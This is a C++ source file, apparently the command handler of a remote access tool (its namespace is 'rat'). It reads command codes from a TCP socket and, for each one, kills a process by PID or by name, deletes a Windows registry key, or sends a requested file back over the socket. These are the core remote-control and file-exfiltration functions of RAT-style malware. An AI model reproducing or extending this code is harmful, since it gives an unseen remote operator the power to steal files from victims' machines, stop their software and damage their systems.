#pragma once

#include "command/clientcmd.h"

namespace rat
{

ClientCmd::ClientCmd()
{
    SetType(-1);
}

ClientCmd::ClientCmd(const TcpSocket& socket, const char* input, int size)
{
    HandleInput(input, size);
    SetSocket(socket);
}

void ClientCmd::HandleInput(const char* input, int size)
{
    using enum rat::Command::CommandType;
    // Get address and port here in input;

    SetType(-1);
    if (size <= 4){
        return;
    }
    if (int type = *((int *)(input)); type == static_cast<int>(kClientKillPid))
    {
        SetType(static_cast<int>(kClientKillPid));
    }
    else if (type == static_cast<int>(kClientKillProcessName))
    {
        SetType(static_cast<int>(kClientKillProcessName));
    }
    else if (type == static_cast<int>(kClientDeleteRegistry))
    {
        SetType(static_cast<int>(kClientDeleteRegistry));
    }
    #ifdef _WIN32
    else if (type == static_cast<int>(kClientSendFile))
    {
        SetType(static_cast<int>(kClientSendFile));
    }
    #endif
    if (GetType() != -1)
    {
        SetArgument(input + 4);
    }
}

void ClientCmd::SetSocket(const TcpSocket& socket)
{
    socket_ = socket;
}


bool ClientCmd::execute()
{
    if (GetType() == -1 || socket_.GetSocket() == INVALID_SOCKET || socket_.Disconnected()){
        return false;
    }
    if (GetType() == static_cast<int>(rat::Command::CommandType::kClientKillPid))
    {
        Process p(std::stoi(&GetArgument()[0]));
        return p.KillSelf();
    }
    else if (GetType() == static_cast<int>(rat::Command::CommandType::kClientKillProcessName))
    {
        Process p(GetArgument());
        return p.KillSelf();
    }
    else if (GetType() == static_cast<int>(rat::Command::CommandType::kClientDeleteRegistry))
    {
        #ifdef _WIN32
            std::string arg = GetArgument();
            std::stringstream ss(arg);
            std::string root_hkey_name;
            std::string sub_key_name;
            ss >> root_hkey_name >> std::ws;
            std::getline(ss, sub_key_name);
            Registry r(root_hkey_name, sub_key_name);
            return r.DeleteSelf();
        #else 
            return false;
        #endif
    }
    else if (GetType() == static_cast<int>(rat::Command::CommandType::kClientSendFile))
    {
        auto f = File(GetArgument());
        if (f.Exists())
        {
            if (f.SendFileThroughSocket(socket_) != 0)
            {
                return false;
            }
            else return true;
        }
    }
    return false;
}

}